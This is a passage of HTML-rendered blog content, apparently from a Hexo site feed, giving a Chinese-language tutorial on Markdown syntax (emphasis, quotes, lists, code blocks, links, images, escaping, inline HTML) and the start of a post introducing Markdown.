asterisks.<br><strong>Bold text</strong> with underscores.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="斜体（Italic）">斜体（Italic）</h3><p>再需要倾斜的文本前后添加一个星号“<code>*</code>”或者下划线“<code>_</code>”，对应HTML中的 <code>&lt;em&gt;</code>标签。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Italicized text is the <span class="emphasis">*cat&#x27;s meow*</span>.</span><br><span class="line">Italicized text is the <span class="emphasis">_cat&#x27;s meow_</span>.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>Italicized text is the <em>cat’s meow</em>.<br>Italicized text is the <em>cat’s meow</em>.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="粗体（Bold）-斜体（Italic）">粗体（Bold）+ 斜体（Italic）</h3><p>如果需要同时对同一段文本使用粗体和斜体，可以在强调文本的前后添加三个星号“<code>*</code>”或者下划线“<code>_</code>”，或者混合使用。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This text is <span class="strong">**<span class="emphasis">*really important*</span>**</span>.</span><br><span class="line">This text is <span class="strong">__<span class="emphasis">_really important_</span>__</span>.</span><br><span class="line">This text is <span class="strong">__<span class="emphasis">*really important*</span>__</span>.</span><br><span class="line">This text is <span class="strong">**<span class="emphasis">_really important_</span>**</span>.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>This text is <em><strong>really important</strong></em>.<br>This text is <em><strong>really important</strong></em>.<br>This text is <strong><em>really important</em></strong>.<br>This text is <strong><em>really important</em></strong>.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="引用">引用</h2><p>在引用文本前使用右尖括号“<code>&gt;</code>”，符号可以重复，实现多级引用的效果，同时引用的内容也可以兼容其他元素效果</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt;  The quarterly results look great!</span></span><br><span class="line"><span class="quote">&gt;</span></span><br><span class="line"><span class="quote">&gt;&gt; - Revenue was off the chart.</span></span><br><span class="line">&gt;&gt; - Profits were higher than ever.</span><br><span class="line"><span class="quote">&gt;</span></span><br><span class="line"><span class="quote">&gt;  <span class="emphasis">*Everything*</span> is going according to <span class="strong">**plan**</span>.</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><blockquote><p>The quarterly results look great!</p><blockquote><ul><li>Revenue was off the chart.</li><li>Profits were higher than ever.</li></ul></blockquote><p><em>Everything</em> is going according to <strong>plan</strong>.</p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="列表">列表</h2><h3 id="有序列表">有序列表</h3><p>在每个列表项前添加数字并紧跟一个英文句点，对应HTML的 <code>&lt;ol&gt;</code>和 <code>&lt;li&gt;</code>。数字不必按数学顺序排列，但是列表应当以数字 1 起始。通过使用缩进可以形成多级列表的样式。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> First item</span><br><span class="line"><span class="bullet">8.</span> Second item</span><br><span class="line"><span class="bullet">5.</span> Third item</span><br><span class="line"><span class="bullet">1.</span> Indented item</span><br><span class="line"><span class="bullet">    2.</span> Indented item</span><br><span class="line"><span class="bullet">2.</span> Fourth item</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>First item</li><li>Second item</li><li>Third item<ol><li>Indented item</li><li>Indented item</li></ol></li><li>Fourth item</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="无序列表">无序列表</h3><p>在每个列表项前面添加破折号“<code>-</code>”、星号“<code>*</code>” 或加号“<code>+</code>”。缩进一个或多个列表项可创建嵌套列表。对应HTML的 <code>&lt;ul&gt;</code>和 <code>&lt;li&gt;</code></p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> First item</span><br><span class="line"><span class="bullet">-</span> Second item</span><br><span class="line"><span class="bullet">-</span> Third item</span><br><span class="line"><span class="bullet">    -</span> Indented item</span><br><span class="line"><span class="bullet">    -</span> Indented item</span><br><span class="line"><span class="bullet">-</span> Fourth item</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>First item</li><li>Second item</li><li>Third item<ul><li>Indented item</li><li>Indented item</li></ul></li><li>Fourth item</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="代码、代码块">代码、代码块</h2><p>要将单词或短语表示为代码，则在单词前后添加反引号“`”。如果需要在代码语句中使用反引号，则需要在代码前后添加两个反引号“``”。如果需要创建代码块，则需要在代码块前后添加三个反引号“```”。许多Markdown处理器都支持受围栏代码块的语法突出显示。使用此功能，您可以为编写代码的任何语言添加颜色突出显示。要添加语法突出显示，请在受防护的代码块之前的反引号旁边指定一种语言。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">At the command prompt, type <span class="code">`nano`</span>.</span><br><span class="line"><span class="code">``Use `</span>code<span class="code">` in your Markdown file.`</span>`</span><br><span class="line"><span class="code">``` Java</span></span><br><span class="line"><span class="code">public class Main &#123;</span></span><br><span class="line"><span class="code">    public static void main(String[] args) &#123;</span></span><br><span class="line"><span class="code">        System.out.println(&quot;Hello, World!&quot;);</span></span><br><span class="line"><span class="code">    &#125;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">```</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>At the command prompt, type <code>nano</code>.<br><code>Use `code` in your Markdown file.</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="分隔线">分隔线</h2><p>要创建分隔线，请在单独一行上使用三个或多个星号 “<code>***</code>”、破折号 “<code>---</code>” 或下划线 “<code>___</code>”，并且不能包含其他内容。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"><span class="strong">***</span></span></span><br><span class="line"><span class="strong"><span class="section">---</span></span></span><br><span class="line"><span class="strong"><span class="section">__<span class="emphasis">_</span></span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>以上三个分隔线的渲染效果是一样的：</p><p><img src="https://s1.vika.cn/space/2023/07/18/9bcc7e1f1f2345b28c767b34c5c9e8e4" alt="image-20230718172717466"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="链接">链接</h2><h3 id="跳转链接">跳转链接</h3><p>链接文本放在中括号内，链接地址放在后面的括号中，链接title可选，格式为：<code>[超链接显示名](超链接地址 &quot;超链接title&quot;)</code>，对应的HTML代码为：<code>&lt;a href=&quot;超链接地址&quot; title=&quot;超链接title&quot;&gt;超链接显示名&lt;/a&gt;</code>。单独使用尖括号“<code>&lt;&gt;</code>”将链接括起来可以使链接可点击跳转。同时，也可以为链接运用其他的格式样式。</p><div class="note warning flat"><p>注意：不同的 Markdown 应用程序处理URL中间的空格方式不一样。为了兼容性，请尽量使用 <code>%20</code>代替空格。</p></div><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这是一个链接：[<span class="string">百度</span>](<span class="link">https://www.baidu.com &quot;点击打开百度搜索&quot;</span>)</span><br><span class="line">这是一个链接：<span class="language-xml">&lt;https://www.baidu.com&gt;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>这是一个链接：<a href="https://www.baidu.com" title="点击打开百度搜索">百度</a><br>这是一个链接：<a href="https://www.baidu.com">https://www.baidu.com</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="引用链接">引用链接</h3><p>引用样式链接是一种特殊的链接，它使URL在Markdown中更易于显示和阅读。引用链接分为两部分：与文本保持内联的部分（格式为：<code>[content][label]</code>）以及存储在文件中其他位置的部分（格式为：<code>[label]:url</code>），以使文本易于阅读。第一部分的两个标签之间可以添加空格，尽管这并非必须的，而第二部分的内容并不会被渲染在页面上。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Markdown是一种[<span class="string">轻量级标记语言</span>][<span class="symbol">1</span>]，创始人为约翰·格鲁伯（John Gruber）。 它允许人们使用易读易写的[<span class="string">纯文本格式</span>][<span class="symbol">2</span>]编写文档，然后转换成有效的 [<span class="string">XHTML</span>][<span class="symbol">3</span>]（或者HTML）文档。这种语言吸收了很多在[<span class="string">电子邮件</span>][<span class="symbol">4</span>]中已有的纯文本标记的特性。——百度百科</span><br><span class="line"></span><br><span class="line">在页面中任意位置：</span><br><span class="line">[<span class="symbol">1</span>]:<span class="link">https://baike.baidu.com/item/轻量级标记语言</span></span><br><span class="line">[<span class="symbol">2</span>]:<span class="link">https://baike.baidu.com/item/纯文本格式</span></span><br><span class="line">[<span class="symbol">3</span>]:<span class="link">https://baike.baidu.com/item/XHTML</span></span><br><span class="line">[<span class="symbol">4</span>]:<span class="link">https://baike.baidu.com/item/电子邮件</span></span><br><span class="line">这些内容并不会渲染出来。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>Markdown是一种<a href="https://baike.baidu.com/item/%E8%BD%BB%E9%87%8F%E7%BA%A7%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">轻量级标记语言</a>，创始人为约翰·格鲁伯（John Gruber）。 它允许人们使用易读易写的<a href="https://baike.baidu.com/item/%E7%BA%AF%E6%96%87%E6%9C%AC%E6%A0%BC%E5%BC%8F">纯文本格式</a>编写文档，然后转换成有效的 <a href="https://baike.baidu.com/item/XHTML">XHTML</a>（或者HTML）文档。这种语言吸收了很多在<a href="https://baike.baidu.com/item/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6">电子邮件</a>中已有的纯文本标记的特性。——百度百科</p><p>在页面中任意位置：</p><p>这些内容并不会渲染出来。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="图片">图片</h2><h3 id="显示图片">显示图片</h3><p>插入图片Markdown语法代码：<code>![图片alt](图片链接 &quot;图片title&quot;)</code>，对应的HTML代码：<code>&lt;img src=&quot;图片链接&quot; alt=&quot;图片alt&quot; title=&quot;图片title&quot;&gt;</code>。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">Markdown Icon</span>](<span class="link">https://s1.vika.cn/space/2023/07/18/23f7e9d3aec747d1b180518ad8a026e7 &quot;这是Markdown的Icon&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><img src="https://s1.vika.cn/space/2023/07/18/23f7e9d3aec747d1b180518ad8a026e7" alt="Markdown Icon" title="这是Markdown的Icon"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="链接图片">链接图片</h3><p>为图片添加连接也即将图片与链接的Markdown样式结合起来。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">![Markdown Icon</span>](<span class="link">https://s1.vika.cn/space/2023/07/18/23f7e9d3aec747d1b180518ad8a026e7 &quot;点击跳转到本文的链接图片部分&quot;</span>)](<span class="link">/posts/2023-07/81d4d2a5.html#链接图片</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><a href="/posts/2023-07/81d4d2a5.html#%E9%93%BE%E6%8E%A5%E5%9B%BE%E7%89%87"><img src="https://s1.vika.cn/space/2023/07/18/23f7e9d3aec747d1b180518ad8a026e7" alt="Markdown Icon" title="点击跳转到本文的链接图片部分"></a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="转义字符">转义字符</h2><h3 id="格式化字符的转义">格式化字符的转义</h3><p>要显示原本用于格式化 Markdown 文档的字符，请在字符前面添加反斜杠字符 \ 。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> 如果没有转义字符，这个句子会被显示成无序列表。</span><br><span class="line"></span><br><span class="line">\* 如果没有转义字符，这个句子会被显示成无序列表。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>如果没有转义字符，这个句子会被显示成无序列表。</li></ul><p>* 如果没有转义字符，这个句子会被显示成无序列表。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>以下列出的字符都可以通过使用反斜杠字符从而达到转义目的。</p><table><thead><tr><th style="text-align:center">字符</th><th style="text-align:center">名称</th><th style="text-align:center">字符</th><th style="text-align:center">名称</th></tr></thead><tbody><tr><td style="text-align:center">\</td><td style="text-align:center">反斜杠</td><td style="text-align:center">`</td><td style="text-align:center">反引号</td></tr><tr><td style="text-align:center">*</td><td style="text-align:center">星号</td><td style="text-align:center">_</td><td style="text-align:center">下划线</td></tr><tr><td style="text-align:center">{}</td><td style="text-align:center">大括号</td><td style="text-align:center">[]</td><td style="text-align:center">中括号</td></tr><tr><td style="text-align:center">()</td><td style="text-align:center">小括号</td><td style="text-align:center">#</td><td style="text-align:center">井号</td></tr><tr><td style="text-align:center">+</td><td style="text-align:center">加号</td><td style="text-align:center">-</td><td style="text-align:center">减号</td></tr><tr><td style="text-align:center">.</td><td style="text-align:center">句点</td><td style="text-align:center">!</td><td style="text-align:center">感叹号</td></tr><tr><td style="text-align:center">|</td><td style="text-align:center">竖线</td><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><div class="note warning flat"><p>注意：如果需要在表格中使用竖线符号“|”，需要替换为实体编号“<code>&amp;#124;</code>”，如果直接使用反斜杠转义（<code>\|</code>），则会显示为反斜杠“\”。</p></div><h3 id="特殊字符的转义">特殊字符的转义</h3><p>在HTML中，有一些字符需要特殊处理才能显示出来，在下方列出的是需要使用实体代码替代的字符。</p><div class="note info flat"><p>此表格内容来自：<a href="https://blog.csdn.net/u014636245/article/details/85798962">CSDN博主「hitrjj」的原创文章)</a></p></div><table><thead><tr><th style="text-align:center">显示结果</th><th style="text-align:center">描述</th><th style="text-align:center">输入</th><th style="text-align:center">实体编号</th></tr></thead><tbody><tr><td style="text-align:center"> </td><td style="text-align:center">空格</td><td style="text-align:center"><code>&amp;nbsp;</code></td><td style="text-align:center"><code>&amp;#160;</code></td></tr><tr><td style="text-align:center">&lt;</td><td style="text-align:center">小于号</td><td style="text-align:center"><code>&amp;lt;</code></td><td style="text-align:center"><code>&amp;#60;</code></td></tr><tr><td style="text-align:center">&gt;</td><td style="text-align:center">大鱼号</td><td style="text-align:center"><code>&amp;gt;</code></td><td style="text-align:center"><code>&amp;#62;</code></td></tr><tr><td style="text-align:center">&amp;</td><td style="text-align:center">和号</td><td style="text-align:center"><code>&amp;amp;</code></td><td style="text-align:center"><code>&amp;#38;</code></td></tr><tr><td style="text-align:center">&quot;</td><td style="text-align:center">引号</td><td style="text-align:center"><code>&amp;quot;</code></td><td style="text-align:center"><code>&amp;#34;</code></td></tr><tr><td style="text-align:center">'</td><td style="text-align:center">单引号</td><td style="text-align:center"><code>&amp;apos;</code> (IE不支持)</td><td style="text-align:center"><code>&amp;#39;</code></td></tr><tr><td style="text-align:center">¢</td><td style="text-align:center">分</td><td style="text-align:center"><code>&amp;cent;</code></td><td style="text-align:center"><code>&amp;#162;</code></td></tr><tr><td style="text-align:center">£</td><td style="text-align:center">镑</td><td style="text-align:center"><code>&amp;pound;</code></td><td style="text-align:center"><code>&amp;#163;</code></td></tr><tr><td style="text-align:center">¥</td><td style="text-align:center">日元</td><td style="text-align:center"><code>&amp;yen;</code></td><td style="text-align:center"><code>&amp;#165;</code></td></tr><tr><td style="text-align:center">§</td><td style="text-align:center">节</td><td style="text-align:center"><code>&amp;sect;</code></td><td style="text-align:center"><code>&amp;#167;</code></td></tr><tr><td style="text-align:center">©</td><td style="text-align:center">版权</td><td style="text-align:center"><code>&amp;copy;</code></td><td style="text-align:center"><code>&amp;#169;</code></td></tr><tr><td style="text-align:center">®</td><td style="text-align:center">注册商标</td><td style="text-align:center"><code>&amp;reg;</code></td><td style="text-align:center"><code>&amp;#174;</code></td></tr><tr><td style="text-align:center">×</td><td style="text-align:center">乘号</td><td style="text-align:center"><code>&amp;times;</code></td><td style="text-align:center"><code>&amp;#215;</code></td></tr><tr><td style="text-align:center">÷</td><td style="text-align:center">除号</td><td style="text-align:center"><code>&amp;divide;</code></td><td style="text-align:center"><code>&amp;#247;</code></td></tr></tbody></table><div class="note warning flat"><p>注意：</p><p>尽管Markdown允许直接使用这些符号，并且在一定情况下会帮你级自动转义，但如果需要将带有特殊符号的链接放入 <code>&lt;a&gt;</code>标签的 <code>href</code>属性中，Markdown就不会自动转换，这时候就需要将链接中所有上表所示内容替换为其对应编号。例如网址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>aaa.bbb.com/images?参数A&amp;参数B</span><br></pre></td></tr></table></figure><p>则需要修改为：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>aaa.bbb.com/images?参数A&amp;参数B</span><br></pre></td></tr></table></figure></div><h2 id="内嵌HTML标签">内嵌HTML标签</h2><h3 id="行级内联标签">行级内联标签</h3><p>HTML 的行级內联标签如 <code>&lt;span&gt;</code>、<code>&lt;cite&gt;</code>、<code>&lt;del&gt;</code> 不受限制，可以在 Markdown 的段落、列表或是标题里任意使用。依照个人习惯，甚至可以不用 Markdown 格式，而采用 HTML 标签来格式化。例如：如果比较喜欢 HTML 的 <code>&lt;a&gt;</code> 或 <code>&lt;img&gt;</code> 标签，可以直接使用这些标签，而不用 Markdown 提供的链接或是图片语法。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This <span class="strong">**word**</span> is bold.  </span><br><span class="line">This <span class="language-xml"><span class="tag">&lt;<span class="name">em</span>&gt;</span></span>word<span class="language-xml"><span class="tag">&lt;/<span class="name">em</span>&gt;</span></span> is italic.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>This <strong>word</strong> is bold.<br>This <em>word</em> is italic.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="区块标签">区块标签</h3><p>区块元素──比如 <code>&lt;div&gt;</code>、<code>&lt;table&gt;</code>、<code>&lt;pre&gt;</code>、<code>&lt;p&gt;</code> 等标签，必须在前后加上空行，以便于内容区分。而且这些元素的开始与结尾标签，不可以用 tab 或是空格来缩进。Markdown 会自动识别这区块元素，避免在区块标签前后加上没有必要的 <code>&lt;p&gt;</code> 标签。</p><div class="note warning flat"><p>注意：Markdown 语法在 HTML 区块标签中将不会被进行处理。例如，你无法在 HTML 区块内使用 Markdown 形式的 <code>*强调*</code>。</p></div><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">This is a regular paragraph.</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="code">    &lt;tr&gt;</span></span><br><span class="line"><span class="code">        &lt;td&gt;table&lt;/td&gt;</span></span><br><span class="line"><span class="code">    &lt;/tr&gt;</span></span><br><span class="line"><span class="code">    *强调*</span></span><br><span class="line"><span class="code">&lt;/table&gt;</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">This is another regular paragraph.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>This is a regular paragraph.</p><table>    <tr>        <td>table</td>    </tr>    *强调*</table><p>This is another regular paragraph.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown是什么</title>
      <link href="/posts/8b048021.html"/>
      <url>/posts/8b048021.html</url>
      
        <content type="html"><![CDATA[<h2 id="Markdown的起源">Markdown的起源</h2><p>Markdown起源于2004年，其设计灵感主要来源于纯文本电子邮件的格式，目标是能让人们能够使用易读、易写的纯文本格式编写文档，并且可以被转化为HTML（超文本标记语言）文档，也可以说Markdown是HTML的简化版，它只提供了最常用的语法格式，并且较为简单，让使用者无需再关注复杂的HTML标签，从而专注于写作。当遇到无法用Markdown特殊标记实现完成的特殊需求时，也可以使用HTML来实现。</p><p><img src="https://s1.vika.cn/space/2023/07/18/23f7e9d3aec747d1b180518ad8a026e7" alt="Markdown208x128"></p><h2 id="Markdown可以在哪里使用">Markdown可以在哪里使用</h2><p>Markdown 无处不在。StackOverflow、CSDN、掘金、简书、GitBook、有道云笔记、V2EX、光谷社区等。主流的代码托管平台，如 GitHub、GitLab、BitBucket、Coding、Gitee 等等，都支持 Markdown 语法，很多开源项目的 README、开发文档、帮助文档、Wiki 等都用 Markdown 写作。</p><ol><li><p>排版网页内容</p><p>Markdown 可以用于撰写网页内容，如博客文章、网页文档等。它的简洁语法使得文本易于阅读和编辑，同时转换为 HTML 后，可以很好地呈现在网页上。</p></li><li><p>文档撰写</p><p>对于技术文档、项目文档、说明书、报告等内容，Markdown可以简易地将内容漂亮地展现出来，比如代码段的呈现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>电子邮件</p><p>一些电子邮件平台为用户提供了Markdown格式的撰写方式，用户可以直接在网页或者客户端中简易的写出一篇美观易读的电子邮件。</p></li><li><p>数学文档</p><p>Markdown还支持$\LaTeX$格式的书写，因此使用者可以将数学公式和符号展示在文档中。比如，复杂数的二次方程通解公式为：</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">渲染演示</button></li><li class="tab"><button 